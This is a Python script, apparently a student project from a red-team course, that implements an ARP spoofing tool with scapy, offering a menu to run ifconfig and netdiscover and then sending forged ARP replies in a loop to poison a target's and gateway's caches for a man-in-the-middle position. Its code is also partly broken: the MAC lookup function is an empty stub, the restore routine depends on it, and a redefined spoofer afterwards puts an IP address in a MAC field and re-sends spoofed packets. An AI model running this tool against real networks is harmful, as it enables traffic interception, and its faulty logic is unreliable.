#!/usr/bin/python3
import scapy.all as scapy
import time
import sys
from art import *
from tabulate import tabulate
import os

tprint("\n  ARP_SPOOFER", "random")

text = """
          \nHello EVERY ONE !!!                
          \n WELCOME To ARP_Spoofer
          \n*******************************************    C3       ****************************************
          
          presented by : civic v chacko
          course       : ADCD
          Institution  : RedTeam Hacker Academy 

             \n***************************************>    Version 0.1   <**********************************
     """

table = [[text]]
output = tabulate(table, tablefmt='grid')

print(output)


def restart():
    os.execv(sys.executable, ['python'] + sys.argv)


options = input("""\n C3 Menu  

          1) Network status
          2) ALL Networks
          3) ARP_Spoofer
          \n Enter your option : """)

if options == '1':
    os.system("\nifconfig")
    print(restart())
elif options == '2':
    try:

        os.system("\nnetdiscover")
    except KeyboardInterrupt:
        print('interception')
    print(restart())

elif options == '3':

    targetIP = str(input("\n\nEnter the target IP : "))

    gatewayIP = str(input("Enter the gateway IP  : "))
    
    destinationmac = input("Enter the target MAC : ")
    
    sourceMAC = input("source MAC : ")
    


    def spoofer(targetIP, spoofIP):

        packet = scapy.ARP(op=2, pdst=targetIP, hwdst=destinationmac, psrc=spoofIP)
        scapy.send(packet, verbose=False)


    def getmac(destinationIP):
        pass


    def restore(destinationIP, attackerIP):

        packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=getmac(destinationIP), psrc=attackerIP, hwsrc=sourceMAC)
        scapy.send(packet, count=4, verbose=False)


    packets = 0
    try:
        while True:
            spoofer(targetIP, gatewayIP)
            spoofer(gatewayIP, targetIP)
            print("\r[+] Sent packets " + str(packets)),
            sys.stdout.flush()
            packets += 2
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
        
        restore(targetIP, gatewayIP)
        restore(gatewayIP, targetIP)


    def spoofer(targetIP, spoofIP):
        destinationmac = getmac(targetIP)
        packet = scapy.ARP(op=2, pdst=targetIP, hwdst=destinationmac, hwsrc=spoofIP)
        scapy.send(packet, verbose=False)


    spoofer(targetIP, gatewayIP)
    spoofer(gatewayIP, targetIP)
    
